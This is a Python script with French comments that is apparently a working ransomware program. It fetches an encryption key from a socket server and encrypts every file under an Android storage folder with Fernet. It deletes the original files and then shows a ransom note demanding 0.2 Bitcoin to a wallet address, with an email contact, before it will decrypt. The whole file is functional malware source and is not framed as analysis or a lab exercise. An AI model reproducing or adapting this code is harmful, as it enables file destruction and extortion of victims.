# coding: utf-8
from ascii_magic import AsciiArt
import socket, os
from cryptography.fernet import Fernet
os.system('clear')
#Définition des couleurs 
RED = "\033[38;5;196m"  
YELLOW = "\033[38;5;226m"
GREEN = "\033[38;5;46m" 
BLUE = "\033[38;5;32m"
RESET = "\033[0m"
ORANGE = "\033[38;5;208m"

obj = "\t#########################################################################################"


# Définition de la fonction de chiffrement
def chiffrer(path):
    with open(path, "rb") as original_file:
        with open(path + ".shadow", "wb") as encrypted_file:
            encrypted_content = fn.encrypt(original_file.read())
            encrypted_file.write(encrypted_content)
    os.remove(path)

# Définition de la fonction de déchiffrement
def dechiffrer(path):
    with open(path, "rb") as encrypted_file:
        with open(path[:-7], "wb") as original_file:  # path[:-7] pour enlever ".shadow"
            decrypted_content = fn.decrypt(encrypted_file.read())
            original_file.write(decrypted_content)
    os.remove(path)

host, port = ("127.0.0.1", 5566)
# Création de la bannière
my_art = AsciiArt.from_image('dev1.png')
my_art.to_terminal()


# Création du socket et connexion au serveur
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(b"key")
    key = s.recv(1024)
    s.close()
except Exception as e:
    print("Erreur de connexion:", e)
    exit(1)

# Création de l'objet Fernet
fn = Fernet(key)

# Chiffrement des fichiers
for path, dirs, files in os.walk("/storage/emulated/0/ShadowWave/jael"):
    for f in files:
        chiffrer(os.path.join(path, f))

# Suppression de la clé et de l'objet Fernet
del key
del fn

# Demande de la clé
while True:
    d_name = f"\t\t\t\t-------+---{BLUE} sh@dow821{RESET}---+-------"
    print("\n", d_name)
    
    print("\n"+obj)
    texte = "\n\t\t\t\t\tYOU HAVE BEEN HACKED              \n\t\t\t\t    YOUR FILES HAVE BEEN ENCRYPTED"
    # Définir la largeur de l'espace dans lequel le texte sera centré
    largeur = 60
    #Combiner alignement et coloriage
    texte_centré = texte.center(largeur)
    texte_coloré_centré = RED + texte_centré + RESET
    print(RED + texte.center(largeur) + RESET)
    

    print("\n"+obj)
    print("\n\t\tVos documents personnels, photos et autres fichiers de cet appareil sont\n\t\tencryptés à l'aide de l'algorithme AES-256. \n\t\tLes fichiers d'origine ont été complètement supprimés et ne seront récupérés\n\t\tqu'en suivant les étapes décrites ci-dessous")
    print("\n\t\t1. Pour obtenir la clé qui déchiffrera les fichiers, vous devez payer 0,2\n\t\tBitcoin à partir de cette adresse de portefeuille :")    
    texte = "\t\t\t>>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa<<"
    # Définir la largeur de l'espace dans lequel le texte sera centré
    largeur = 60
    #Combiner alignement et coloriage
    texte_centré = texte.center(largeur)
    texte_coloré_centré = YELLOW + texte_centré + RESET
    print(YELLOW + texte.center(largeur) + RESET)

    
    phrase = "\n\t\t2. Une fois le paiement terminé, contactez-nous à sh@dow821@gmail.com\n\t\t  et envoyez-nous l'ID de la transaction ou votre capture d'écran, et nous\n\t\t  vous donnerons la clé."

    # Mot à colorer
    mot = "sh@dow821@gmail.com"

    # Remplacer le mot par la version colorée
    phrase_colorée = phrase.replace(mot, YELLOW + mot + RESET)

        # Afficher le texte avec le mot coloré
    print(phrase_colorée)
    print(f"\n\t\t{RED}AVERTISSEMENT::{RESET}")
    print("\t\t    [+] Ne renommez pas ou ne modifiez pas les fichiers cryptés.\n\t\t    [+] N'arrêtez pas ou ne redémarrez pas votre appareil car vous nerécupérerez\n\t\t       jamais vos fichiers.\n\t\t    [+] N'entrez aucune clé, nous ne sommes pas responsables de vos propres actions.\n\n")
    print(f"\t\t{GREEN}VEILLEZ ENTREZ LA CLÉ DE DECHIFFREMENT{RESET}")
    key2 = input(f"\tKEY : {ORANGE} ")

    try:
        fn = Fernet(key2)
        # Déchiffrement des éléments
        os.system('clear')
        my_art.to_terminal()
        print("\n"+obj)
        texte ="\t\t\t\t     Dechiffrement des fichiers en cours..."
        print(BLUE + texte.format("bonjour") + RESET)
        print("\n"+obj+"\n")
        for path, dirs, files in os.walk("/storage/emulated/0/ShadowWave/jael"):
            for f in files:
                dechiffrer(os.path.join(path, f))
                message = f"\t{os.path.join(path, f)}{GREEN} restauré!{RESET}"
                print("\t"+ message)
    
    except Exception as e:
        print("ERREUR ->", e)
    else:
        break